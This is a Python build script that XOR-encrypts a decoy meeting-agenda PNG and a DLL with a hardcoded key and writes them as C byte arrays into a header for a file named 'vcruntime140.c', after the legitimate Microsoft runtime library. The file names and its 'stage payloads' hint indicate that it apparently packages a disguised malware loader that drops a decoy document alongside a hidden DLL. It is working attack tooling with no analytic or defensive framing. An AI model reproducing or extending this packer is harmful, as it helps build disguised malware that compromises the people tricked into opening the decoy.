#!/usr/bin/env python3
"""XOR-encrypt Agenda PNG + cloudstore.dll into data.h for vcruntime140.c."""

from __future__ import annotations

import sys
from pathlib import Path

STAGE = Path(__file__).resolve().parent
REPO = STAGE.parent.parent
PNG_PATH = REPO / "cloudstore" / "Agenda_15-19_6-2026.png"
DLL_PATH = STAGE.parent / "CloudStore" / "cloudstore.dll"
OUT_PATH = STAGE / "data.h"

ck2 = b"9832gf2bc29_120e9hd10c))b@@!11"
ck2l = 30


def bin_to_c_enc(data: bytes, name: str) -> str:
    enc_data = bytearray(b ^ ck2[i % ck2l] for i, b in enumerate(data))
    res = f"unsigned char {name}[] = {{\n"
    for i in range(0, len(enc_data), 16):
        chunk = enc_data[i : i + 16]
        res += "    " + ", ".join(f"0x{x:02x}" for x in chunk) + ",\n"
    res += "};\n"
    res += f"unsigned int {name}_len = {len(data)};\n"
    return res


def main() -> int:
    for label, path in (("PNG", PNG_PATH), ("DLL", DLL_PATH)):
        if not path.is_file():
            print(f"error: missing {label}: {path}", file=sys.stderr)
            print(
                "hint: embed Agenda PNG in cloudstore/ and copy mmdevlib.dll to "
                "DriversCloud/CloudStore/cloudstore.dll (see prepare_stage_payloads.sh)",
                file=sys.stderr,
            )
            return 1

    png_data = PNG_PATH.read_bytes()
    dll_data = DLL_PATH.read_bytes()
    if not png_data or not dll_data:
        print("error: empty payload input", file=sys.stderr)
        return 1

    OUT_PATH.write_text(
        bin_to_c_enc(png_data, "file_sys") + bin_to_c_enc(dll_data, "file_dll")
    )
    print(f"wrote {OUT_PATH} (png={len(png_data)} dll={len(dll_data)} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
